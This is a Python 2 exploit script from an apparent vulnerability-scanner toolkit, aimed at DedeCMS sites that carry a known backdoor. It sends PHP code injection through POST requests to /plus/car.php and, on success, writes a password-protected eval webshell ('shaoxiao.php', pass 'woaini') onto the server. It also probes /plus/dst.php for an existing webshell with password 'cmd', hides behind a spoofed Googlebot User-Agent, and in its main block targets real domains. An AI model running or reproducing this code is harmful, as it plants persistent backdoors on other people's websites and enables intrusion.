#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#参考https://www.t00ls.net/thread-23103-1-1.html
#转换方法 http://wdot.cc/dede.php
#http://bugscan.net/plugin/84
import httplib
import sys
import threading

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs

###########dedecms官方一句话扫描##########################
class dedecms_yijuhua:
#    def __init__(self,url):
#        threading.Thread.__init__(self)
#        self.url=url  #URL
#        self.scan(self.url)
#        #print "%s close--dedecms_yijuhua!!!!!"%(self.url)

    def assign(self,service, arg=None):
        if service == 'DedeCms':
            return True, arg

    def scan(self,arg):
        self.url0, self.url1 = arg
        url = self.url1.split('//')[1]
        site = '/5.66/plus/car.php'
        data = '''$a=${@phpinfo()};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Content-type":"application/x-www-form-urlencoded"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('POST',site,data,heareds)
            httpres = conn.getresponse()
            html = httpres.read()
            if 'allow_url_fopen' in html:
                self.echo(url)
            else:
                self.find(url)
        except Exception,e:
            #print e
            return False
    def echo(self,arg):
        site = '/plus/car.php'
        data = '''$a=${@file_put_contents("shaoxiao.php","<?php eval(\$_POST[woaini]); ?>")};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('POST',site,data,heareds)
            #httpres = conn.getresponse()
            data='http://%s/plus/shaoxiao.php' % arg

#            EXP_list=[]    #["网址","漏洞类型","漏洞地址","备注"]
#            EXP_list.append(arg)
#            EXP_list.append("exp_dedecms_yijuhua")
#            EXP_list.append(data)
#            EXP_list.append("webshell--pass:woaini")
#            Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
           # print "exp_dedecms_yijuhua---%s---%s"%(data,"webshell--pass:woaini")
        except Exception,e:
            #print e
            return False

    def find(self,arg):
        site = '/plus/dst.php'
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('GET',site,None,heareds)
            httpres = conn.getresponse()
            if httpres.status == 200:
                data='http://%s/plus/dst.php' % arg
                print data
                if yijuhua_cs("php",data,"cmd"):   #ASP还是PHP  ,URL地址 ，密码
                #是
                    EXP_list=[1,self.url0,self.url1,"CN_exp_dedecms_yijuhua",data,"cmd","webshell"]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    url_exp.put(EXP_list,0.5)   #插入队列
                else:
                #否
                    EXP_list=[0,self.url0,self.url1,"CN_exp_dedecms_yijuhua",data,"cmd","webshell"]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    url_exp.put(EXP_list,0.5)   #插入队列
#                print "exp_dedecms_yijuhua---%s---%s"%(data,"webshell--pass:cmd")
        except Exception,e:
            #print e
            return False


################################################
if __name__=='__main__':
    class_www=dedecms_yijuhua()
    class_www.scan(class_www.assign('DedeCms', ("http://www.baidu.com","http://91qingniao.com"))[1])




